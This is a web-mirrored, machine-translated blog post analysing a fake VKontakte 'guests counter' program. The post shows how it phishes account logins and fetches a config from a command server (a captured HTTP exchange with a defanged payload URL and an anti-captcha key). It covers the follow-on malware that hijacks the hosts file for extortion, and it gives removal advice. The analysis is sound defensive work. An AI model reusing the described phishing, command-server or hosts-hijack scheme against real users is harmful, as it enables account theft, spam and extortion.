<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>"Guests on my page" Another malicious spam VKontakte</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello. Not so long ago, I wrote about the distribution of malware on the social network "Vkontakte". Not so long ago met a new, in general, a similar ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>"Guests on my page" Another malicious spam VKontakte</h1><div class="post__text post__text-html js-mediator-article">  Hello.  Not so long ago, I <a href="http://habrahabr.ru/blogs/virus/117801/">wrote</a> about the distribution of malware on the social network "Vkontakte".  Not so long ago met a new, in general, a similar case ... <br>  They threw me on the analysis of a certain VKGuests.exe file, which should show who visits the VKontakte page.  The file was downloaded from the site vko-blog.ru, the link to which came from a friend.  The complaint was that the Internet was "missing."  Curious.  We pick. <br><br><img src="https://habrastorage.org/storage/5d069132/10febeb8/5bcd2320/3ee8cd44.png"><br><a name="habracut"></a><br><br>  Before you go to the file, it would be interesting to read what they write on that site. <br>  We see the classic zamanuhu about the "uniqueness of our program" from the allegedly Pavel Durov. <br>  Everything is clear) At the very bottom of the blue button "Set counter", when you click on it, in fact, it is proposed to download VKGuests.exe. <br>  The file is a PE binary, weighing 2,230,040 bytes, protected by DotFix Niceprotect. <br>  At the time of the check, it was <a href="http://www.virustotal.com/file-scan/report.html%3Fid%3D4e312b5e28b95397bb432b4a163c13a148da644828453dc5be6e135976274ce7-1304610840">detected</a> on virustotal 12/42 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      We try to run, we are greeted by a nice-looking window recommending to close all browsers for one hundred percent of the work of this ‚Äúcounter‚Äù.  Close the browser, click OK.  At least a beautiful window opens with fields for entering the login / password of the account of VKontakte. <br><br><img src="https://habrastorage.org/storage/9f6c0707/65e84162/9a6e8dce/00169e26.png"><br><br><img src="https://habrastorage.org/storage/f3fb92e9/745f1ec1/79d0b4bb/29bf81ea.png"><br><br>  We take in hands a sniffer, we enter data from a baldy.  When entering the login is not in the form of an email box - refers to the error.  Let's try to portray mail, for example 1111@mail.ru, the password must be no shorter than 6 characters. <br><br>  Sniffer caught the connection with the address 91.193.194.113, which does not apply to the cozy contact. <br>  Session Contents: <br><blockquote>  GET /stat/config.txt HTTP / 1.1 <br>  Host: sjhgjjd.ru <br>  Accept: text / html, * / * <br>  Accept-Encoding: gzip, deflate, identity <br>  User-Agent: Mozilla / 5.0 (Windows; U; Windows NT 5.1; ru; rv: 1.9.1.3) Gecko / 20090824 Firefox / 3.5.3 <br><br>  HTTP / 1.1 200 OK <br>  Date: Thu, 05 May 2011 16:22:10 GMT <br>  Server: Apache / 2 <br>  Last-Modified: Sun, 01 May 2011 10:42:57 GMT <br>  ETag: "5c01b-b4-4a23491ebee40" <br>  Accept-Ranges: bytes <br>  Vary: Accept-Encoding, User-Agent <br>  Content-Encoding: gzip <br>  Content-Length: 158 <br>  Content-Type: text / plain <br><br>  "Timeout": "0" <br>  "Photo_url": "h <i>xx</i> p: //cs10358.vkontakte.ru/u7041153/133719745/x_07e5f13b.jpg" <br>  "File_url": "h <i>xx</i> p: //sjhgjjd.ru/install_msi.exe" <br>  "Ac_key": "15f8a3de833b23fd150188ddd3d1f9d7" </blockquote><br>  Aha, curious things are given out for downloading: a link to a strange file from an incomprehensible address, a link to a picture with a brief content of that blog, which was mentioned at the beginning, and the key from the anti-captcha service used for spam / flood systems protected by captcha.  Well, I like I somehow came across.  We close VKGuests.exe to hell and download the file by the link yourself. <br><br>  Before us is a compressed using UPX file <b>install_msi.exe</b> , weighing 179,200 bytes.  We remove UPX, and the executable compiled in PureBasic, weighing 198,656 bytes, appears to us. <br><ul><li>  <a href="http://www.virustotal.com/file-scan/report.html%3Fid%3D1ef324feabc0848fb88c1d7033978ce952f8094b348871e4c75fad1e8762b7da-1304621573">packed</a> </li><li>  <a href="http://www.virustotal.com/file-scan/report.html%3Fid%3D94979e884e2be66afd2f02c624b53ed363cd7b192f4bf4b1478fe0dc2c49f9bf-1304621579">unpacked</a> </li></ul>  <i>Unfortunately, virus night is very overloaded tonight, so they freeze my reports for several hours already, which is why at first the test may be unavailable.</i> <i><br></i>  <i>I duplicated it on jotty, there the result is generally <a href="http://virusscan.jotti.org/ru/scanresult/c90ea923b3f6a9d6e49cedbe1045a014efb5b258">2/20 for compressed</a> and <a href="http://virusscan.jotti.org/ru/scanresult/b5dd2971010c7bcd355ea85936770dceb0db30ea">1/20 for uncompressed</a> files.</i> <br><br>  We go further - we look at the resources of the experimental subject, where we find, of course, an obfuscated batch file, changing the host file. <br><br><img src="https://habrastorage.org/storage/71a573ae/7e0145ae/e9e47e5d/d2a6e625.png"><br><br>  When accessing blocked sites we will be offered to pay money to the webmoney accounts via the Qiwi terminal: <br><br><img src="https://habrastorage.org/storage/1ef78894/38fcc5d1/45c34136/30112cc8.png"><br><br>  In general, for treatment, it is only necessary to delete both hosts files from c: \ windows \ system32 \ drivers \ etc \ (one of them will be hidden, in the other one letter is not Latin. <br><br>  But what if we entered real data at the very beginning of the experiment? <br>  Entering the correct data, the program begins to actively download the "missing components" from the network, which were described above. <br><br><img src="https://habrastorage.org/storage/a6f872be/86736699/4476e1fb/181fc177.png"><br><br><img src="https://habrastorage.org/storage/6033c3f1/b4f48a2a/610150ff/d16a8d44.png"><br><br><img src="https://habrastorage.org/storage/b3bd7205/82031da8/cbdf0999/b8652ee0.png"><br><br>  Then he ‚Äúthinks‚Äù for a long time, sending spam, and restarts the computer. <br>  I have already said that this malicious package receives a key for anti-captcha, and so it is used to mass-mark all the friends in the photo added to the profile of the account whose data was entered.  It is possible that the login and password sent to the server in the same way automatically will be used for further spam. <br><br>  The virus is not resident, so after a reboot, it not only does not continue to work, but is also removed from the system, grabbing all the junk that was downloaded.  Well, except for spoofed hosts =) <br><br>  Actually everything.  Nothing more interesting could be squeezed out of this malware, and we didn‚Äôt want to. </div><p>Source: <a href="https://habr.com/ru/post/118815/">https://habr.com/ru/post/118815/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../118803/index.html">Sony servers worked on an outdated version of Apache</a></li>
<li><a href="../118804/index.html">Just todo-list</a></li>
<li><a href="../118808/index.html">He knew!</a></li>
<li><a href="../118809/index.html">BackupBackup.ru - and you made a backup?</a></li>
<li><a href="../118810/index.html">PiterFm / MoskvaFm Pro Client</a></li>
<li><a href="../118816/index.html">Three-dimensional transistors. 22nm</a></li>
<li><a href="../118817/index.html">NetPing: designer for administrator and leisure for programmer</a></li>
<li><a href="../118819/index.html">Win a free participation in DEVCONF 2011</a></li>
<li><a href="../118821/index.html">Purchased links, goodbye?</a></li>
<li><a href="../118822/index.html">What to read on the weekend? Recommended, issue number 10</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>